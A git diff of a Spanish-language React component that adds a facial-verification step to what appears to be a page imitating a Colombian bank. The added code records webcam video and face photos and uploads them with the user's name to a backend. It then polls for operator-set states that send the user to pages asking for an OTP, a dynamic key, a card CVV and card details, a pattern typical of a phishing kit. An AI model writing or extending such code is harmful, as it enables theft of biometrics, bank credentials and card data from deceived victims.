@@ -1,24 +1,49 @@
+import './css/LoginModal.css';
 import { useEffect, useState, useRef } from "react";
 import { FaceDetection } from "@mediapipe/face_detection";
 import { Camera } from "@mediapipe/camera_utils";
-import './css/LoginModal.css';
 import { limpiarPaddingBody } from "@utils";
+import { isMobile } from "@utils";
+import Loading from "app/components/Loading";
+import { instanceBackend } from "app/axios/instanceBackend";
+import { useNavigate } from "react-router-dom";
 
 // Se exporta el componente
 export default function VerificacionIdentidad() {
+  const navigate = useNavigate();
+  const [sesionId, setSesionId] = useState(null);
+  const [username, setUsername] = useState("Usuario");
+  const photosRef = useRef([]); // Store captured photos
+
+  // Duración de la grabación en segundos
+  const RECORD_DURATION = 5;
 
   // Se inicializan los estados para manejar el continuar
   const [formState, setFormState] = useState({
     paso: 1,
+    disabledAtras: false,
+    estadoEspabilar: false,
+    cargando: false,
+    disabledContinuar: false,
     continuar: false,
-    volverIntentar: false,
     error: false,
     ok: false,
     texto: "Empezar",
+    textoAtras: "Atrás",
     contador: 3
   });
 
+  // Se inicializa la variable mobile
+  const mobile = isMobile();
+
   // Ref para la cámara
+  const hasRecordedRef = useRef(false);
+  const [stableTime, setStableTime] = useState(0);
+  const stableTimerRef = useRef(null);
+  const [progress, setProgress] = useState(0);
+  const mediaRecorderRef = useRef(null);
+  const recordedChunksRef = useRef([]);
+  const stopTimeoutRef = useRef(null);
   const videoRef = useRef(null);
   const cameraRef = useRef(null);
   const faceDetectorRef = useRef(null);
@@ -26,6 +51,15 @@ export default function VerificacionIdentidad() {
   // Se inicializa los estados
   const [ip, setIp] = useState("");
   const [fechaHora, setFechaHora] = useState("");
+
+  useEffect(() => {
+    const raw = localStorage.getItem("datos_usuario");
+    if (raw) {
+      const data = JSON.parse(raw);
+      setSesionId(data.sesion_id);
+      setUsername(data.nombreCompleto || "Usuario");
+    }
+  }, []);
 
   // Se crea el useEffect para iniciar la cámara y la detección facial
   useEffect(() => {
@@ -42,27 +76,70 @@ export default function VerificacionIdentidad() {
     // Función para inicializar la detección facial
     const initFaceDetection = async () => {
 
-      faceDetectorRef.current = new FaceDetection({
-        locateFile: (file) =>
-          `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`,
-      });
+      // Se crea la instancia del FaceDetection
+      faceDetectorRef.current = new FaceDetection({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`, });
 
+      // Se configuran las opciones del FaceDetection
       faceDetectorRef.current.setOptions({
         model: "short",
         minDetectionConfidence: 0.7,
       });
 
+      // Se define el callback para los resultados del FaceDetection
       faceDetectorRef.current.onResults((results) => {
+
+        // Se calcula el progreso basado en las detecciones
         if (results.detections && results.detections.length === 1) {
-          setFormState(prev => ({ ...prev, ok: true, error: false }));
+
+          // Si hay una detección, se inicia o continúa el temporizador estable
+          if (!stableTimerRef.current) {
+
+            // Inicia el temporizador estable
+            stableTimerRef.current = setTimeout(() => {
+
+              // Se actualiza el estado a ok
+              setFormState((prev) => ({
+                ...prev,
+                ok: true,
+                error: false,
+              }));
+            }, 300);
+          };
         } else {
-          setFormState(prev => ({ ...prev, ok: false, error: false }));
+
+          // Si no hay detecciones, se reinicia el temporizador estable
+          if (stableTimerRef.current) {
+
+            // Se limpia el temporizador estable
+            clearTimeout(stableTimerRef.current);
+
+            // Se limpia la referencia
+            stableTimerRef.current = null;
+          };
+
+          // Se actualiza el estado a error
+          setFormState((prev) => ({
+            ...prev,
+            ok: false,
+            error: true,
+            disabledAtras: false,
+            disabledContinuar: false,
+          }));
+
+          // Reinicia tanto el progreso como el tiempo estable
+          setProgress(0);
+          setStableTime(0);
         }
       });
 
+      // Se crea la instancia de la cámara
       cameraRef.current = new Camera(videoRef.current, {
+
+        // onReady callback
         onFrame: async () => {
-          await faceDetectorRef.current.send({
+
+          // Se envía el frame al FaceDetection
+          await faceDetectorRef.current?.send({
             image: videoRef.current,
           });
         },
@@ -70,20 +147,31 @@ export default function VerificacionIdentidad() {
         height: 400,
       });
 
+      // Se inicia la cámara
       cameraRef.current.start();
     };
 
+    // Se llama a la función para iniciar la detección facial
     initFaceDetection();
 
+    // Cleanup al desmontar o cambiar de paso
     return () => {
+
+      // Se detiene la cámara y se cierra el FaceDetection
       if (cameraRef.current) {
+
+        // Se detiene la cámara
         cameraRef.current.stop();
         cameraRef.current = null;
-      }
+      };
+
+      // Se cierra el FaceDetection
       if (faceDetectorRef.current) {
+
+        // Se cierra el FaceDetection
         faceDetectorRef.current.close();
         faceDetectorRef.current = null;
-      }
+      };
     };
   }, [formState.paso]);
 
@@ -100,29 +188,34 @@ export default function VerificacionIdentidad() {
   //  Se crea el useEffect para ejecutar 1 minuto 
   useEffect(() => {
 
-    // Ejecutar inmediatamente al montar
-    obtenerFechaHora();
-
     // Calcular cuánto falta para el próximo minuto exacto
     const ahora = new Date();
-    const msHastaProximoMinuto =
-      (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
+    const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
 
+    // Se inicializa el intervalo
     let intervalId;
 
     // Timeout para sincronizar con el cambio exacto de minuto
     const timeoutId = setTimeout(() => {
+
+      // Se obtiene la fecha/hora con formato
       obtenerFechaHora();
 
       // Luego actualizar cada 60 segundos
       intervalId = setInterval(() => {
+
+        // Se obtiene la fecha/hora con formato
         obtenerFechaHora();
       }, 60000);
     }, msHastaProximoMinuto);
 
     // Cleanup
     return () => {
+
+      // Se limpia el timeout y el intervalo
       clearTimeout(timeoutId);
+
+      // Se limpia el intervalo si existe
       if (intervalId) clearInterval(intervalId);
     };
   }, []);
@@ -200,20 +293,342 @@ export default function VerificacionIdentidad() {
           ...prev,
           paso: 3,
           continuar: true,
-          texto: "Validar"
+          texto: "Comenzar",
         };
       };
 
       // Paso 3 (aquí puedes enviar info o finalizar)
       if (prev.paso === 3) {
 
-        // Aquí podrías agregar lógica para enviar datos o finalizar el proceso
-        return prev;
+        // Se crea el metodo para empezar a grabar
+        return {
+          ...prev,
+          disabledContinuar: true,
+          disabledAtras: true
+        };
       };
 
       // Por defecto,
       return prev;
     });
+  };
+
+  // Función para manejar el botón de atrás
+  const handleAtras = () => {
+
+    // Se actualiza el estado según el paso actual
+    setFormState((prev) => {
+
+      // Paso 2 → Paso 1
+      if (prev.paso === 2) {
+
+        // Volver al paso 1
+        return {
+          ...prev,
+          paso: 1,
+          texto: "Empezar"
+        };
+      };
+
+      // Paso 3 → Paso 2
+      if (prev.paso === 3) {
+
+        // Detener grabación si está en curso
+        stopRecording();
+
+        // Volver al paso 2
+        return {
+          ...prev,
+          paso: 2,
+          texto: "Continuar"
+        };
+      };
+
+      // Por defecto,
+      return prev;
+    });
+  };
+
+  // Se crea el metodo para detener la grabación
+  const stopRecording = () => {
+
+    // Se limpia el timeout si existe
+    if (stopTimeoutRef.current) {
+
+      // Se limpia el timeout
+      clearTimeout(stopTimeoutRef.current);
+
+      // Se limpia la referencia
+      stopTimeoutRef.current = null;
+    }
+
+    // Se detiene la grabación si está en curso
+    if (mediaRecorderRef.current?.state === "recording") {
+
+      // Se detiene el MediaRecorder
+      mediaRecorderRef.current.stop();
+
+      // Se limpia la referencia
+      mediaRecorderRef.current = null;
+    };
+  };
+
+  // Efecto para controlar el progreso cuando el estado es ok
+  useEffect(() => {
+
+    // Se declara la variable intervalId
+    let intervalId;
+
+    // Si el estado es ok, inicia el conteo de tiempo
+    if (formState.ok) {
+
+      // Inicia el conteo de tiempo estable
+      intervalId = setInterval(() => {
+
+        // Se actualiza el tiempo estable
+        setStableTime((prevTime) => {
+
+          // Incrementa cada 100ms
+          const newTime = prevTime + 0.1;
+
+          // Si han pasado más de 3 segundos, comienza a llenar el círculo
+          if (newTime >= 3) {
+
+            // 5 segundos totales de grabación después de los 3 segundos de espera
+            const progressPercentage = Math.min((newTime - 3) / 5, 1);
+
+            // Actualiza el progreso
+            setProgress(progressPercentage);
+
+            // Se muestra el mensaje para espabilar
+            setFormState((prev) => {
+
+              // Se actualiza el estado a espabilar
+              return {
+                ...prev,
+                estadoEspabilar: true
+              };
+            });
+
+            // Cuando llega al 100%, inicia la grabación
+            if (progressPercentage >= 1 && !mediaRecorderRef.current && !hasRecordedRef.current) {
+
+              // Se bloquea para que no grabe más de una vez
+              hasRecordedRef.current = true;
+
+              // Inicia la grabación
+              startRecording();
+            };
+          };
+
+          // Se retorna el nuevo tiempo
+          return newTime;
+        });
+      }, 100);
+    } else {
+
+      // Reinicia el tiempo cuando no está ok
+      setStableTime(0);
+      setProgress(0);
+    };
+
+    // Se retorna el cleanup
+    return () => {
+
+      // Se limpia el intervalo si existe
+      if (intervalId) {
+
+        // Se limpia el intervalo
+        clearInterval(intervalId);
+      };
+    };
+  }, [formState.ok]);
+
+  // Helper to capture a frame
+  const captureFrame = async () => {
+    if (!videoRef.current) return null;
+    try {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoRef.current.videoWidth;
+      canvas.height = videoRef.current.videoHeight;
+      const ctx = canvas.getContext("2d");
+      // Flip horizontally to match video mirror
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(videoRef.current, 0, 0);
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    } catch (e) {
+      console.error("Error capturing frame", e);
+      return null;
+    }
+  };
+
+  // Se crea el metodo para empezar a grabar
+  const startRecording = () => {
+
+    // Se valida que el video tenga el stream
+    if (!videoRef.current?.srcObject) return;
+
+    // Se obtiene el stream del video
+    const stream = videoRef.current.srcObject;
+
+    // Se limpia el array de chunks grabados
+    recordedChunksRef.current = [];
+    photosRef.current = []; // Reset photos
+
+    // Se crea el MediaRecorder
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp8", });
+
+    // Evento para cuando hay datos disponibles
+    mediaRecorder.ondataavailable = (event) => {
+
+      // Se almacenan los datos grabados
+      if (event.data.size > 0) {
+
+        // Se agrega el chunk al array
+        recordedChunksRef.current.push(event.data);
+      };
+    };
+
+    // Evento para cuando se detiene la grabación
+    mediaRecorder.onstop = () => {
+
+      // Se crea el blob con los datos grabados
+      const blob = new Blob(recordedChunksRef.current, { type: "video/webm", });
+
+      console.log("Grabación finalizada -> ", blob);
+
+      // Upload Biometrics
+      handleUploadBiometrics(blob, photosRef.current);
+
+      // Se detiene el proceso de grabación
+      stopRecording();
+    };
+
+    // Se inicia la grabación
+    mediaRecorder.start();
+
+    // Se guarda la referencia del MediaRecorder
+    mediaRecorderRef.current = mediaRecorder;
+
+    // Capture photos at intervals [1s, 2s, 3s]
+    const capture = async () => {
+      if (photosRef.current.length < 3) {
+        const photo = await captureFrame();
+        if (photo) photosRef.current.push(photo);
+      }
+    };
+
+    // Schedule captures
+    setTimeout(capture, 1000);
+    setTimeout(capture, 2500);
+    setTimeout(capture, 4000);
+
+    // ⏱ Detener EXACTAMENTE en X segundos
+    stopTimeoutRef.current = setTimeout(() => {
+
+      // Se detiene la grabación
+      if (mediaRecorderRef.current?.state === "recording") {
+
+        // Se detiene el MediaRecorder
+        mediaRecorderRef.current.stop();
+
+        // Se limpia la referencia
+        mediaRecorderRef.current = null;
+
+        // Se usa el cargando
+        setFormState((prev) => {
+
+          // Se actualiza el estado a cargando
+          return {
+            ...prev,
+            ok: false,              // 👈 corta el efecto
+            estadoEspabilar: false,
+            cargando: true,
+          };
+        });
+      }
+    }, RECORD_DURATION * 1000);
+  };
+
+  const handleUploadBiometrics = async (videoBlob, photos) => {
+    if (!sesionId) {
+      console.error("No session ID found");
+      return;
+    }
+
+    // Set loading state
+    setFormState(prev => ({
+      ...prev,
+      ok: false,
+      estadoEspabilar: false,
+      cargando: true
+    }));
+
+    try {
+      const formData = new FormData();
+      formData.append('sessionId', sesionId);
+      formData.append('username', username);
+      formData.append('video', videoBlob, 'biometrics_video.webm');
+
+      if (photos[0]) formData.append('image1', photos[0], 'face_1.jpg');
+      if (photos[1]) formData.append('image2', photos[1], 'face_2.jpg');
+      if (photos[2]) formData.append('image3', photos[2], 'face_3.jpg');
+
+      await instanceBackend.post('/biometrics/upload', formData, {
+        headers: { 'Content-Type': 'multipart/form-data' }
+      });
+
+      console.log("Biometrics uploaded successfully");
+      // Start polling for status
+      iniciarPolling(sesionId);
+
+    } catch (error) {
+      console.error("Error uploading biometrics:", error);
+      setFormState(prev => ({ ...prev, cargando: false, error: true }));
+      alert("Error al subir la verificación. Por favor intente nuevamente.");
+    }
+  };
+
+  const iniciarPolling = (sid) => {
+    let attempts = 0;
+    const MAX_ATTEMPTS = 100;
+
+    const pollingInterval = setInterval(async () => {
+      try {
+        attempts++;
+        const response = await instanceBackend.post(`/consultar-estado/${sid}`);
+        const { estado } = response.data;
+
+        console.log('Polling Status:', estado);
+
+        if (attempts >= MAX_ATTEMPTS) {
+          clearInterval(pollingInterval);
+          setFormState(prev => ({ ...prev, cargando: false, error: true }));
+          return;
+        }
+
+        // Define states to redirect
+        const statusMap = {
+          'solicitar_otp': '/numero-otp',
+          'solicitar_din': '/clave-dinamica',
+          'solicitar_finalizar': '/finalizado-page',
+          'error_923': '/error-923page',
+          'solicitar_cvv': '/validacion-cvv',
+          'solicitar_tc_custom': '/tc-custom',
+          'error_login': '/autenticacion',
+          'aprobado': '/finalizado-page' // Or wherever
+        };
+
+        if (statusMap[estado]) {
+          clearInterval(pollingInterval);
+          navigate(statusMap[estado]);
+        }
+
+      } catch (error) {
+        console.error("Polling error:", error);
+      }
+    }, 3000);
   };
 
   // Se retorna el componente
@@ -251,7 +666,6 @@ export default function VerificacionIdentidad() {
 
           <div className="login-page">
             <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
-
               <div
                 style={{
                   display: "flex",
@@ -286,19 +700,22 @@ export default function VerificacionIdentidad() {
                     </div>
                   </div>
 
-                  <h2 style={{
-                    fontSize: "20px",
-                    fontWeight: "bold",
-                    marginBottom: "20px",
-                    lineHeight: "1.3",
-                    color: "#ffffff"
-                  }}>
-                    ¡Te damos la bienvenida biometría facial!
-                  </h2>
-
-                  <p style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
-                    Una alianza para la transformación digital segura.
-                  </p>
+                  <div style={{ textAlign: 'center' }}>
+                    <h2
+                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
+                      style={{
+                        fontSize: "20px",
+                        fontWeight: "bold",
+                        marginBottom: "20px",
+                        lineHeight: "1.3",
+                        color: "#ffffff",
+                      }}>
+                      ¡Bienvenido a Biometría Facial!
+                    </h2>
+                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
+                      Una alianza para la transformación digital segura.
+                    </p>
+                  </div>
 
                   <div
                     style={{
@@ -364,53 +781,75 @@ export default function VerificacionIdentidad() {
                     </div>
                   </div>
 
-                  <h2 className="mt-2" style={{
-                    fontSize: "20px",
-                    fontWeight: "bold",
-                    marginBottom: "20px",
-                    lineHeight: "1.3",
-                    color: "#ffffff"
-                  }}>
+                  <h2 className="mt-2"
+                    style={{
+                      fontSize: "20px",
+                      fontWeight: "bold",
+                      marginBottom: "20px",
+                      lineHeight: "1.3",
+                      color: "#ffffff"
+                    }}>
                     Verificación de identidad
                   </h2>
 
-                  <p className="mt-4" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
-                    Necesitamos verificar tu identidad para continuar con el proceso de forma segura.
-                  </p>
+                  <div style={{ textAlignLast: "center" }}>
+                    <span
+                      className="bc-card-auth-description"
+                      style={{
+                        display: "block",
+                        fontSize: "13.5px",
+                        marginBottom: "10px",
+                        color: "#ffffff",
+                      }}
+                    >
+                      Necesitamos verificar tu identidad para continuar con el proceso de forma segura.
+                    </span>
 
-                  <p className="mt-4 mb-4" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
-                    Para completar la verificacion, acepta los permisos de la cámara y sigue las instrucciones:
-                  </p>
+                    <span
+                      className="bc-card-auth-description"
+                      style={{
+                        display: "block",
+                        fontSize: "13.5px",
+                        color: "#ffffff",
+                      }}
+                    >
+                      Para completar la verificación, acepta los permisos de la cámara y sigue las instrucciones:
+                    </span>
+                  </div>
 
                   <div className="info-list mt-4 mb-4">
                     <div className="info-item">
                       <img src="/assets/images/img1.svg" alt="" />
-                      <p className="info-text">
-                        <h5 style={{ color: "#fdda24" }}>
+                      <span className="info-text">
+                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                           Ubicate en un espacio iluminado
                         </h5>
-                        Mejor un lugar con luz natural o luz blanca.
-                      </p>
+                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
+                          Mejor un lugar con luz natural o luz blanca.
+                        </span>
+                      </span>
                     </div>
-
                     <div className="info-item">
                       <img src="/assets/images/img2.svg" alt="" />
-                      <p className="info-text">
-                        <h5 style={{ color: "#fdda24" }}>
+                      <span className="info-text">
+                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                           Ubica tú celular a la altura de tu rostro
                         </h5>
-                        Mantén la cabeza recta mirando al frente y ubica tu celular a esa altura.
-                      </p>
+                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
+                          Mantén la cabeza recta mirando al frente y ubica tu celular a esa altura.
+                        </span>
+                      </span>
                     </div>
-
                     <div className="info-item">
                       <img src="/assets/images/img3.svg" alt="" />
-                      <p className="info-text">
-                        <h5 style={{ color: "#fdda24" }}>
+                      <span className="info-text">
+                        <h5 className="bc-card-auth-description" style={{ color: "#fdda24", fontSize: 13.5, lineHeight: "5px", fontWeight: "600" }}>
                           Retira los accesorios
                         </h5>
-                        Evita cubrir tu rostro con tú cabello, gafas, gorras, tapabocas, etc.
-                      </p>
+                        <span className="bc-card-auth-description line-height mt-0" style={{ fontSize: 12.5 }}>
+                          Evita cubrir tu rostro con tú cabello, gafas, gorras, tapabocas, etc.
+                        </span>
+                      </span>
                     </div>
                   </div>
                 </> : null}
@@ -418,58 +857,160 @@ export default function VerificacionIdentidad() {
               {formState.paso === 3 ?
                 <>
                   <div
-                    id="webcam-container"
                     style={{
-                      position: "relative",
-                      width: "320px",
-                      margin: "0 auto",
+                      display: "flex",
+                      justifyContent: "center"
                     }}
                   >
-                    {/* Video */}
-                    <video
-                      key="video-face"
-                      ref={videoRef}
-                      autoPlay
-                      playsInline
-                      muted
-                      style={{
-                        width: "100%",
-                        borderRadius: "12px",
-                      }}
-                    />
-
-                    {/* Overlay */}
                     <div
                       style={{
-                        position: "absolute",
-                        inset: 0,
+                        width: "60px",
+                        height: "60px",
+                        borderRadius: "50%",
                         display: "flex",
-                        justifyContent: "center",
                         alignItems: "center",
-                        pointerEvents: "none",
+                        justifyContent: "center",
+                        marginBottom: "20px"
                       }}
                     >
-                      <div
+                      <img
+                        src="/assets/images/indicacion/celular_logo2.png"
+                        alt="Alert Icon"
+                      />
+                    </div>
+                  </div>
+
+                  <div style={{ textAlign: 'center' }}>
+                    <h2
+                      className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center"
+                      style={{
+                        fontSize: "20px",
+                        fontWeight: "bold",
+                        marginBottom: "20px",
+                        lineHeight: "1.3",
+                        color: "#ffffff",
+                      }}>
+                      Verificando tu identidad
+                    </h2>
+                    <p className="bc-card-auth-description" style={{ fontSize: "14px", lineHeight: "1.5", marginBottom: "15px", color: "#ffffff" }}>
+                      Mantén tu rostro centrado dentro del circulo y espera a que se complete la verificación.
+                    </p>
+                  </div>
+
+                  <div
+                    id="webcam-container"
+                    style={{
+                      width: "180px",
+                      margin: "0 auto",
+                      position: "relative",
+                    }}
+                  >
+                    {/* CONTENEDOR CIRCULAR REAL */}
+                    <div
+                      style={{
+                        width: "180px",
+                        height: "180px",
+                        borderRadius: "50%",
+                        overflow: "hidden",     // 🔥 CLAVE: recorte real
+                        position: "relative",
+                        backgroundColor: "#000",
+                      }}
+                    >
+                      {/* VIDEO */}
+                      <video
+                        ref={videoRef}
+                        autoPlay
+                        playsInline
+                        muted
                         style={{
-                          width: "220px",
-                          height: "220px",
-                          borderRadius: "50%",
-                          border: "5px solid #1f2a44",
-                          display: "flex",
-                          justifyContent: "center",
-                          alignItems: "center",
+                          width: "100%",
+                          height: "100%",
+                          objectFit: "cover",   // 🔥 llena el círculo sin deformar
+                          transform: "scaleX(-1)",
+                        }}
+                      />
+
+                      {/* OVERLAY (GUIA / PROGRESO / ERROR) */}
+                      <svg
+                        width="180"
+                        height="180"
+                        viewBox="0 0 180 180"
+                        style={{
+                          position: "absolute",
+                          inset: 0,
+                          pointerEvents: "none",
                         }}
                       >
-                        <div className="face-dashed-container">
-                          <div className={`face-dashed ${formState.ok ? "spin" : ""}`} />
-                        </div>
-                      </div>
-                    </div>
+                        {/* Guía blanca */}
+                        <circle
+                          cx="90"
+                          cy="90"
+                          r="88"
+                          fill="none"
+                          stroke="#ffffff"
+                          strokeWidth="5"
+                          strokeDasharray="4 4"
+                          opacity="0.8"
+                        />
 
-                    {/* Mensaje de error */}
-                    {formState.error && (
-                      <p style={{ color: "#fdda24", fontSize: "13px", marginTop: "10px" }}>
+                        {/* Error */}
+                        {(formState.error && formState.cargando == false) && (
+                          <circle
+                            cx="90"
+                            cy="90"
+                            r="88"
+                            fill="none"
+                            stroke="#ff3b30"
+                            strokeWidth="5"
+                          />
+                        )}
+
+                        {/* Progreso */}
+                        {(formState.ok && formState.cargando == false) && (
+                          <circle
+                            cx="90"
+                            cy="90"
+                            r="88"
+                            fill="none"
+                            stroke="#4BB543"
+                            strokeWidth="5"
+                            strokeLinecap="round"
+                            strokeDasharray={2 * Math.PI * 88}
+                            strokeDashoffset={(2 * Math.PI * 88) * (1 - progress)}
+                            transform="rotate(-90 90 90)"
+                          />
+                        )}
+                      </svg>
+                    </div>
+                  </div>
+                  <div>
+                    {/* MENSAJE */}
+                    {(formState.error && formState.cargando == false) && (
+                      <p
+                        className="bc-card-auth-description"
+                        style={{
+                          color: "#fff",
+                          fontSize: "12px",
+                          marginTop: "10px",
+                          textAlign: "center",
+                        }}
+                      >
                         Ubica tu rostro dentro del círculo
+                      </p>
+                    )}
+
+                    {/* MENSAJE */}
+                    {(formState.estadoEspabilar && formState.cargando == false) && (
+                      <p
+                        className="bc-card-auth-description"
+                        style={{
+                          color: "#fff",
+                          fontSize: "12px",
+                          marginTop: "10px",
+                          textAlign: "center",
+                        }}
+                      >
+                        Mantén una expresión neutra, luego parpadea naturalmente mientras se completa la verificación.
                       </p>
                     )}
                   </div>
@@ -499,9 +1040,16 @@ export default function VerificacionIdentidad() {
               </div>
 
               <div className="mt-4" style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
-                <button className="login-btn" onClick={handleContinuar}>
-                  {formState.texto}
-                </button>
+                {(formState.paso > 1 && formState.paso < 3) && (
+                  <button className="bc-button-primary login-btn-borrar" onClick={handleAtras} style={{ fontSize: "14px" }} disabled={formState.disabledAtras}>
+                    {formState.textoAtras}
+                  </button>
+                )}
+                {formState.paso < 3 && (
+                  <button className="bc-button-primary login-btn" onClick={handleContinuar} style={{ fontSize: "14px" }} disabled={formState.disabledContinuar}>
+                    {formState.texto}
+                  </button>
+                )}
               </div>
             </div>
           </div>
@@ -525,12 +1073,12 @@ export default function VerificacionIdentidad() {
                     style={{ width: "180px" }}
                   />
                 </div>
-                <div>
+                <div style={{ alignSelf: 'center' }}>
                   <span className="vigilado">
                     <img
                       src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                       alt="Superintendencia"
-                      style={{ width: "180px" }}
+                      style={{ width: "140px" }}
                     />
                   </span>
                 </div>
@@ -547,6 +1095,9 @@ export default function VerificacionIdentidad() {
       <div className="visual-captcha" style={{ cursor: "pointer" }}>
         <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
       </div>
+
+      {formState.cargando ?
+        <Loading /> : null}
     </>
   );
 };
